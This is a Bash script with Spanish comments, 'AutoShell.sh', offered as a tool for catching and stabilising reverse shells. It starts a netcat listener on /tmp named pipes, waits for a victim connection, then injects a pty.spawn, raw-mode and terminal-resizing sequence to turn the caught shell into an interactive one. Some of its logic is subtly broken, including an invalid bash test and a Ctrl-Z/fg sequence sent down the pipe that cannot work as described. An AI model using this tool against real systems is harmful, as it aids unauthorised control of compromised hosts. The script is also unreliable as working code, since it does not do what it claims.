#!/usr/bin/env bash

# AutoShell.sh - Estabilizador 100% Automático de Reverse Shells
# Versión: 4.0
set -e
IFS=$'\n\t'

# Configuración por defecto
DEFAULT_IP=""
DEFAULT_PORT="4444"
TIMEOUT=30

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Función para mostrar ayuda
show_help() {
    echo -e "${BLUE}Uso:${NC}"
    echo "  $0 [IP] [PUERTO]"
    echo "  $0 (sin parámetros para modo interactivo)"
    echo -e "\n${BLUE}Ejemplos:${NC}"
    echo "  $0 192.168.1.10 4444"
    echo "  $0 8080"
    exit 0
}

# Función de limpieza
cleanup() {
    echo -e "\n${YELLOW}[*] Limpiando...${NC}"
    [[ -p "/tmp/input" ]] && rm -f /tmp/input
    [[ -p "/tmp/output" ]] && rm -f /tmp/output
    [[ -n $NC_PID ]] && kill -9 $NC_PID 2>/dev/null
    stty sane 2>/dev/null || true
    exit 0
}

# Validación de IP
validate_ip() {
    local ip=$1
    local stat=1

    if [[ $ip =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
        IFS='.' read -r -a octets <<< "$ip"
        [[ ${octets[0]} -le 255 && ${octets[1]} -le 255 && \
           ${octets[2]} -le 255 && ${octets[3]} -le 255 ]]
        stat=$?
    elif [[ $ip =~ ^[0-9a-fA-F:]+$ ]]; then
        stat=0
    elif [[ $ip == "localhost" ]]; then
        stat=0
    fi

    return $stat
}

# Validación de puerto
validate_port() {
    local port=$1
    [[ $port =~ ^[0-9]+$ ]] && ((port >= 1 && port <= 65535))
    return $?
}

# Preguntas interactivas
ask_parameters() {
    echo -e "${BLUE}[*] Modo interactivo${NC}"

    while :; do
        read -p "Introduce IP [${DEFAULT_IP:-auto}]: " ip
        ip=${ip:-$DEFAULT_IP}
        if [[ -z "$ip" || validate_ip "$ip" ]]; then
            break
        else
            echo -e "${RED}[!] IP no válida${NC}"
        fi
    done

    while :; do
        read -p "Introduce puerto [${DEFAULT_PORT}]: " port
        port=${port:-$DEFAULT_PORT}
        if validate_port "$port"; then
            break
        else
            echo -e "${RED}[!] Puerto no válido (1-65535)${NC}"
        fi
    done

    LISTEN_IP=$ip
    PORT=$port
}

# Verificación de dependencias
check_deps() {
    local missing=()
    local cmds=("nc" "mkfifo" "stty")

    for cmd in "${cmds[@]}"; do
        if ! command -v $cmd &>/dev/null; then
            missing+=("$cmd")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${RED}[!] Faltan dependencias: ${missing[*]}${NC}"
        echo -e "${YELLOW}[*] Instala con: sudo apt install ${missing[*]}${NC}"
        exit 1
    fi
}

# Detectar variante de netcat
detect_nc_variant() {
    local nc_help
    nc_help=$(nc -h 2>&1 || nc --help 2>&1 || netcat -h 2>&1 || netcat --help 2>&1)

    if echo "$nc_help" | grep -q "\-e"; then
        NC_LISTENER="nc -lvp $PORT"
    elif echo "$nc_help" | grep -q "\-c"; then
        NC_LISTENER="nc -lvnp $PORT"
    else
        NC_LISTENER="nc -lvnp $PORT"
    fi
}

# Detectar tamaño del terminal
get_terminal_size() {
    if command -v stty &>/dev/null; then
        TERM_ROWS=$(stty size 2>/dev/null | awk '{print $1}')
        TERM_COLS=$(stty size 2>/dev/null | awk '{print $2}')
    else
        TERM_ROWS=24
        TERM_COLS=80
    fi
}

# Main
trap cleanup SIGINT SIGTERM EXIT

if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    show_help
fi

if [[ $# -eq 2 ]]; then
    if validate_ip "$1" && validate_port "$2"; then
        LISTEN_IP=$1
        PORT=$2
        echo -e "${GREEN}[+] Parámetros validados:${NC}"
        echo -e "    - IP: ${LISTEN_IP:-Todas las interfaces}"
        echo -e "    - Puerto: $PORT"
    else
        echo -e "${RED}[!] Argumentos no válidos${NC}"
        show_help
    fi
elif [[ $# -eq 0 ]]; then
    ask_parameters
else
    echo -e "${RED}[!] Número de argumentos incorrecto${NC}"
    show_help
fi

check_deps
detect_nc_variant
get_terminal_size

# Crear FIFO
rm -f /tmp/input /tmp/output 2>/dev/null || true
mkfifo /tmp/input /tmp/output

echo -e "${YELLOW}[*] Iniciando listener en ${LISTEN_IP:-Todas las interfaces}:${PORT}${NC}"
echo -e "${YELLOW}[*] Ejecutando: $NC_LISTENER${NC}"

# Iniciar listener
( $NC_LISTENER < /tmp/input > /tmp/output 2>&1 ) &
NC_PID=$!

echo -e "${YELLOW}[*] Esperando conexión...${NC}"

while IFS= read -r line || [[ -n "$line" ]]; do
    echo "$line"
    if [[ "$line" == *"connect"* || "$line" == *"Connection from"* || "$line" == *"Conexión"* ]]; then
        echo -e "${GREEN}[+] Conexión establecida${NC}"
        echo -e "${YELLOW}[*] Mejorando shell...${NC}"
        break
    fi
done < <(cat /tmp/output & PID=$!; sleep $TIMEOUT; kill $PID 2>/dev/null)

{
    echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || /usr/bin/script -qc /bin/bash /dev/null"
    sleep 2
    echo -e "\x1A"
    sleep 2
    echo "stty raw -echo ; fg"
    sleep 2
    echo ""
    sleep 2
    echo "reset"
    sleep 2
    echo "export SHELL=bash"
    echo "export TERM=xterm-256color"
    echo "stty rows $TERM_ROWS cols $TERM_COLS"
    echo "clear"
    echo "echo -e '\033[0;32m[+] Shell mejorada con éxito!\033[0m # ¡Shell interactiva lista!'"
} > /tmp/input

cat /tmp/output &
cat > /tmp/input
